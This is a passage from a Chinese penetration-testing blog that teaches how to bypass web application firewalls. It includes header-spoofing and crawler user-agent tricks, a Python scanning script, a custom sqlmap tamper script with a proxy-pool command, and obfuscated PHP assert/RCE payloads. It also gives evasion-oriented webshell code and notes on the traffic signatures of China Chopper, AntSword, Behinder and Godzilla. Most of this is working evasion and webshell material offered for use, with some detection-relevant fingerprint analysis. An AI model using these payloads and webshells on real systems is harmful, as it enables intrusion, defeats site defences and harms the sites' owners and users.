class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">a=1GET / HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="http-charset"><a class="markdownIt-Anchor" href="#http-charset"></a> HTTP charset</h3><p>利用<code>Content-Type: xxx;charset=xxx</code>编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。</p><p>需要了解上面的编码绕过相关知识，针对的是post。</p><h2 id="waf特性"><a class="markdownIt-Anchor" href="#waf特性"></a> Waf特性</h2><h3 id="云waf"><a class="markdownIt-Anchor" href="#云waf"></a> 云waf</h3><p>写host地址，直达真正的地址，不经过云转发即可！</p><h3 id="白名单绕过"><a class="markdownIt-Anchor" href="#白名单绕过"></a> 白名单绕过</h3><p>一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><h4 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单"></a> IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypasswaf</p><blockquote><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p></blockquote><h4 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源"></a> 静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测</p><p>效率，不去检测这样一些静态文件名后缀的请求。</p><blockquote><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p></blockquote><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h4 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单"></a> url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h3 id="content-type绕过"><a class="markdownIt-Anchor" href="#content-type绕过"></a> Content-Type绕过</h3><p>一些WAF识别到特定的content-type后，则会判定为该请求的类型，如：</p><p>发现<code>Content-Type</code>为<code>multipart/form-data</code>时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他类型的payload</p><h3 id="请求方式绕过"><a class="markdownIt-Anchor" href="#请求方式绕过"></a> 请求方式绕过</h3><ol><li><p>一些WAF对于<code>get</code>请求和<code>post</code>请求的处理机制不一样，可能对POST请求稍加松懈，因此给<code>GET</code>请求变成<code>POST</code>请求有可能绕过拦截。</p></li><li><p>一些WAF检测到<code>POST</code>请求后，就不会对<code>GET</code>携带的参数进行过滤检测，因此导致被绕过。</p></li><li><p>一些WAF检测到HEAD等等请求后，会直接拦截（因为不像是人的操作）</p></li></ol><h3 id="解析兼容性"><a class="markdownIt-Anchor" href="#解析兼容性"></a> 解析兼容性</h3><p>这个之前说过，举个例子：如果waf是检测<code>filename=&quot;&quot;</code>的最后一个<code>&quot;</code>，那么，只要我们这样构造：<code>filename=&quot;sss&quot;s.php</code>他就不拦截了，会保存为<code>s.php</code>。</p><h2 id="容器特性"><a class="markdownIt-Anchor" href="#容器特性"></a> 容器特性</h2><h3 id="iisasp"><a class="markdownIt-Anchor" href="#iisasp"></a> IIS+ASP</h3><ol><li><code>%</code>会被自动去掉</li><li>unicode会自动解码</li></ol><h3 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h3><p>路径穿越</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h1 id="信息搜集绕过waf"><a class="markdownIt-Anchor" href="#信息搜集绕过waf"></a> 信息搜集绕过waf</h1><p>一般对网站进行扫描的时候，都会产生大量数据包，一些网站对将之识别为CC攻击等等。</p><p>如果遇到这种防护，分WAF的类别，例如有阿里云的网站服务器适配、有宝塔等等软件waf等。一般都自己写代码来实现绕过。</p><p>那么我们有如下绕过方式</p><h2 id="模拟用户请求"><a class="markdownIt-Anchor" href="#模拟用户请求"></a> 模拟用户请求</h2><p>即使用常用的UA和常用的请求方式：GET/POST等。</p><h2 id="延时"><a class="markdownIt-Anchor" href="#延时"></a> 延时</h2><p>设置延时，每3秒扫一条（阿里云的限制）</p><h2 id="模拟爬虫"><a class="markdownIt-Anchor" href="#模拟爬虫"></a> 模拟爬虫</h2><p>一般waf为了保证网站被收录，不会拦截爬虫。所以在UA上设置成爬虫即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">百度爬虫，第二条为百度图片爬虫</span><br><span class="line">Baiduspider+(+http://www.baidu.com/search/spider.htm&quot;)</span><br><span class="line">Baiduspider-image</span><br><span class="line">google爬虫，最后一条为google图片搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.googlebot.com/bot.html)</span><br><span class="line">Googlebot/2.1 (+http://www.google.com/bot.html)</span><br><span class="line">Googlebot-Image/1.0</span><br><span class="line">即刻搜索爬虫</span><br><span class="line">Mozilla/5.0 (compatible; JikeSpider; +http://shoulu.jike.com/spider.html)</span><br><span class="line">雅虎爬虫（分别是雅虎中国和美国总部的爬虫）</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp&quot;)</span><br><span class="line">新浪爱问爬虫</span><br><span class="line">iaskspider/2.0(+http://iask.com/help/help_index.html&quot;)</span><br><span class="line">Mozilla/5.0 (compatible; iaskspider/1.0; MSIE 6.0)</span><br><span class="line">搜狗爬虫,第三条为搜狗图片爬虫</span><br><span class="line">Sogou web spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Push Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">Sogou Pic Spider/3.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br><span class="line">搜搜爬虫</span><br><span class="line">Sosospider+(+http://help.soso.com/webspider.htm)</span><br><span class="line">网易有道爬虫</span><br><span class="line">Mozilla/5.0 (compatible; YoudaoBot/1.0; http://www.youdao.com/help/webmaster/spider/; )</span><br><span class="line">MSN爬虫</span><br><span class="line">msnbot/1.0 (+http://search.msn.com/msnbot.htm)</span><br></pre></td></tr></table></figure><h2 id="代理池"><a class="markdownIt-Anchor" href="#代理池"></a> 代理池</h2><p>因为延时很慢，所以有代理池，使用不同的IP请求，这些IP会转发包回你的IP。免费的代理池很有可能被识别出来，最好用付费的。例如：<a href="https://www.kuaidaili.com/">快代理</a>。当然，也有免费的：<a href="https://blog.csdn.net/weixin_48584917/article/details/121710521">proxy pool</a></p><p>代理代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搜索引擎爬虫模拟及模拟真实用户</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="comment">#模拟用户 Kit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span></span><br><span class="line"><span class="comment">#模拟引擎 Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span></span><br><span class="line"><span class="comment">#更多爬虫引擎：https://www.cnblogs.com/iack/p/3557371.html</span></span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; Baiduspider-render/2.0;</span></span><br><span class="line"><span class="string">+http://www.baidu.com/search/spider.html)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>:</span><br><span class="line"><span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/si</span></span><br><span class="line"><span class="string">gned-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>,<span class="comment">#根据当前访问 cookie</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> paths <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;php_b.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">url=<span class="string">&#x27;http://192.168.0.103:8081/&#x27;</span></span><br><span class="line">paths=paths.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">urls=url+paths</span><br><span class="line"><span class="comment">#如需测试加代理，或加入代理池需加代理</span></span><br><span class="line">proxy = &#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;127.0.0.1:7777&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        code=requests.get(urls,headers=headers,verify=<span class="literal">False</span>).status_code</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">if</span> code==<span class="number">200</span> <span class="keyword">or</span> code==<span class="number">403</span>:</span><br><span class="line"><span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line"><span class="comment">#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度）</span></span><br></pre></td></tr></table></figure><h2 id="白名单机制上面有提到"><a class="markdownIt-Anchor" href="#白名单机制上面有提到"></a> 白名单机制（上面有提到）</h2><h1 id="漏洞发现绕过waf"><a class="markdownIt-Anchor" href="#漏洞发现绕过waf"></a> 漏洞发现绕过waf</h1><p>其实思路和上面一样，多了一些就是对流量特征的更改。现在说一下联动：</p><h2 id="awvsburpxray-漏扫-payload-绕过-延时被动"><a class="markdownIt-Anchor" href="#awvsburpxray-漏扫-payload-绕过-延时被动"></a> awvs+burp+xray 漏扫 Payload 绕过-延时，被动</h2><ol><li>awvs设置<ol><li>慢扫</li><li>UA改为爬虫UA</li><li>设置转发</li></ol></li><li>Burp<ol><li>设置代理转发</li></ol></li><li>XRAY<ol><li>监听</li></ol></li></ol><p><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613151222688.png" alt="image-20230613151222688" /></p><p>因为AWVS有慢速扫描还好，如果没有的话，就需要BURP来控制速度（可以安装一个按键精灵，哈哈哈哈），这样才能控制XRAY。</p><p>因为每个工具识别漏洞的Payload不一样，所以才可能不会被识别，<strong>所以才有联动这一说法</strong>。如果存在一款可以自己改Payload特征啥（有HTTP头的更改啥的）的就好了，而且需要控制速度，这通常需要我们自己写。</p><h1 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h1><p>这里将不讨论常用的绕过，重点在于工具的绕过以及工具的流量特征。</p><h2 id="sql注入sqlmap特征"><a class="markdownIt-Anchor" href="#sql注入sqlmap特征"></a> sql注入（sqlmap特征）</h2><p>【特征1】攻击产生的流量非常多，一般都会触发cc攻击的防御机制，所以一般会使用<code>--delay</code>或者代理池</p><p>【特征2】默认参数，产生的流量如下，其ua头有sqlmap字样，很容易辨认，所以一般会使用参数<code>--random-agent</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /pikachu/vul/sqli/sqli_str.php?name=admin&amp;submit=查询 HTTP/1.1</span><br><span class="line">CACHE-CONTROL: no-cache</span><br><span class="line">CONNECTION: close</span><br><span class="line">USER-AGENT: sqlmap/1.5.8#stable (http://sqlmap.org)</span><br><span class="line">ACCEPT: */*</span><br><span class="line">HOST: 192.168.68.78</span><br><span class="line">ACCEPT-ENCODING: gzip,deflate</span><br></pre></td></tr></table></figure><p>【特征3】 xss测试语句、随机数的位数</p><p>【特征4】注入流程/句子比较固定</p><p>综合上述，我们可以自己写tamper来替代一些注入句子，更改特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload,**kwargs</span>):</span><br><span class="line">    retVal =<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;/*!4457select*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;%20&quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;%23a%0a&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;database()&quot;</span>,<span class="string">&quot;database%23a%0a()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>所以，最终的payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;***&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent</span><br></pre></td></tr></table></figure><p>总结一下绕过：</p><ol><li>代理：绕过传cc</li><li>tamper：注入规则</li><li>user-agent：修改ua，防止匹配到工具的指纹</li></ol><h2 id="xssxsstrike绕过"><a class="markdownIt-Anchor" href="#xssxsstrike绕过"></a> XSS（XSStrike绕过）</h2><p>利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc。跑就完事儿了！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsstrike.py -u &quot;目标网址&quot; --timeout x  延时</span><br><span class="line">xsstrike.py -u &quot;目标网址&quot; --proxy  代理地址</span><br></pre></td></tr></table></figure><h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2><h3 id="可逆算法绕过"><a class="markdownIt-Anchor" href="#可逆算法绕过"></a> 可逆算法绕过</h3><ul><li><p>base64：很可能base64_decode会被拦截（如果你传入的代码自带base64解码，那当然万事胜意啦，如果没有，那么就只能你传入一个解码函数了）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=base64_decode(cGhwaW5mbygp)</span><br></pre></td></tr></table></figure></li><li><p>url 编码</p></li><li><p>进制编码（十六进制）等：很可能会拦截hex等函数，理由跟base64差不多。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$hex=&#x27;706870696E666F2829&#x27;;assert(pack(&quot;H*&quot;,$hex));submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure></li></ul><h3 id="替换绕过"><a class="markdownIt-Anchor" href="#替换绕过"></a> 替换绕过</h3><p>也就是将一个字符设置为空，那么这个字符可以加载到任何位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h3 id="拼接"><a class="markdownIt-Anchor" href="#拼接"></a> 拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txt=$X=&#x27;asse&#x27;;$xx=&#x27;rt&#x27;;$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4ce</span><br></pre></td></tr></table></figure><h3 id="更改传参方式"><a class="markdownIt-Anchor" href="#更改传参方式"></a> 更改传参方式</h3><p>实际上就是post的data部分传入GET请求，然后再在get请求URL上填入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[URL GET]</span><br><span class="line">http:/127.0.0.1/pikachu/vul/rce/rce_eval.php?x=rt</span><br><span class="line">[POST DATA]</span><br><span class="line">txt=$x=&#x27;asse&#x27;;$xx=$GET[&#x27;x&#x27;];$xxx=$x.$xx;$y=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhpxinxfo()&#x27;);$xxx($y);&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2><p>：没什么好说的就这几种 …\ …/ …\等</p><h1 id="权限控制"><a class="markdownIt-Anchor" href="#权限控制"></a> 权限控制</h1><p>一个文件上传到网站之后，杀毒软件会对这个文件进行扫描和监控后续敏感操作。</p><ol><li>代码级别的绕过，需要识别各种后门的代码是否是恶意代码</li><li>操作级别的绕过，对后门的操作合理化</li></ol><h2 id="免杀思路"><a class="markdownIt-Anchor" href="#免杀思路"></a> 免杀思路</h2><h3 id="变量覆盖"><a class="markdownIt-Anchor" href="#变量覆盖"></a> 变量覆盖</h3><p>例如：<code>&lt;?php assert($_POST['chopper'])?&gt;</code></p><p>变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b($_POST[&#x27;z&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=phpinfo()</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>简单拆分不行，因为waf会进行变量跟踪</li><li>出现关键词不行，会直接拦截</li><li>如果传入的<code>phpinfo()</code>等操作被拦截，则需要配合编码</li></ul><h3 id="编码-2"><a class="markdownIt-Anchor" href="#编码-2"></a> 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;x&#x27;];</span><br><span class="line">$$a = $_GET[&#x27;y&#x27;];</span><br><span class="line">$b(base64_decode($_POST[&#x27;z&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>传递的参数为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /URL/?x=b&amp;y=assert</span><br><span class="line">...</span><br><span class="line">[data]</span><br><span class="line">z=cGhwaW5mbygp</span><br></pre></td></tr></table></figure><h3 id="异或操作加密混淆"><a class="markdownIt-Anchor" href="#异或操作加密混淆"></a> 异或操作&amp;&amp;加密混淆</h3><p>可以使用工具：</p><ul><li><a href="https://www.phpjiami.com/phpjiami.html">网络接口加密（更稳）</a></li><li><a href="https://github.com/djunny/enphp">enphp工具</a></li></ul><h3 id="造轮子"><a class="markdownIt-Anchor" href="#造轮子"></a> 造轮子</h3><p>waf基本都有菜刀、蚁剑、冰蝎的指纹，当你使用他们的时候，一些危害行为会被拦截！</p><p>要想不被识别拦截，只能自己造轮子！</p><p>自己写数据包，不会有那些指纹特征，就能实现功能！</p><h2 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h2><h3 id="冰蝎"><a class="markdownIt-Anchor" href="#冰蝎"></a> <a href="https://github.com/rebeyond/Behinder/releases/">冰蝎</a>、<a href="https://github.com/AntSwordProject/antSword/releases">蚁剑</a>、<a href="https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw?code=xiao">菜刀</a>、哥斯拉</h3><h4 id="原理以及优缺点"><a class="markdownIt-Anchor" href="#原理以及优缺点"></a> 原理以及优缺点</h4><p><strong>原理</strong>：把一些具体执行语句集成化（各种各样在功能语句都帮你写好了），你直接连接执行就可！</p><p><strong>优缺点</strong>：菜刀：未更新状态，无插件，单向加密传输。蚁剑：更新状态，有插件，拓展性强，单向加密传输。冰蝎：更新状态，未知插件，偏向于后渗透（MSF），双向加密传输</p><p>单向加密传输是什么？我加密数据给服务器，而服务器返回的就没有加密。</p><h4 id="流量分析"><a class="markdownIt-Anchor" href="#流量分析"></a> 流量分析</h4><p><strong>菜刀</strong>：【z0，明文/base64】</p><ul><li>eval函数执行</li><li>攻击的payload使用base64编码</li><li>默认参数<code>z0 </code>对应<code>$_POST [z0]</code>接收到的数据，该参数值是使用 Base64 编码的，所以可以利用 base64 解码可以看到攻击明文</li></ul><img src="/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20230613211014792.png" alt="image-20230613211014792" style="zoom:67%;" /><p><strong>蚁剑</strong>：【ini_set，部分明文】</p><ul><li>正文解码发现：<code>@ini_set (&quot;display_errors&quot;,&quot;0&quot;);</code>，也使用base64加密payload</li><li>参数名大多以 <code>_0x.....=</code>”这种形式（下划线可替换为其他）</li><li>后面为加密数据的数据包也可识别为蚁剑的流量特征</li></ul><p><strong>冰蝎</strong>：【UA头，content-type，数据长度（协商密钥数据等长），返回的全是加密字符】</p><ul><li>冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream。还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的</li><li>内置很多UA头，相同IP重复请求，但是UA头不一样，则需要注意</li></ul><p><strong>哥斯拉</strong>（base64 加密）：【响应三次】</p><ul><li>发送一段固定代码（payload），http 响应为空</li><li>发送一段固定代码（test），执行结果为固定内容</li><li>发送一段固定代码（getBacisInfo）</li></ul><h3 id="混淆免杀工具"><a class="markdownIt-Anchor" href="#混淆免杀工具"></a> 混淆免杀工具</h3><p>上面有提到一些。</p><p>注：蚁剑和菜刀的流量后门基本上是一致的，所以都可以用他的混淆，例如D盾的混淆：<strong>as-webshell-venom</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/WAF%E7%BB%95%E8%BF%87-%E4%B8%80%E8%88%AC%E6%80%A7%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/WAF%E7%BB%95%E8%BF%87-16867110382</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="waf绕过" scheme="https://j3f5.github.io/tags/waf%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>HTTP与开发基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/HTTP%E4%B8%8E%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-12T05:25:20.000Z</published>
    <updated>2023-06-12T05:25:20.000Z</updated>
    
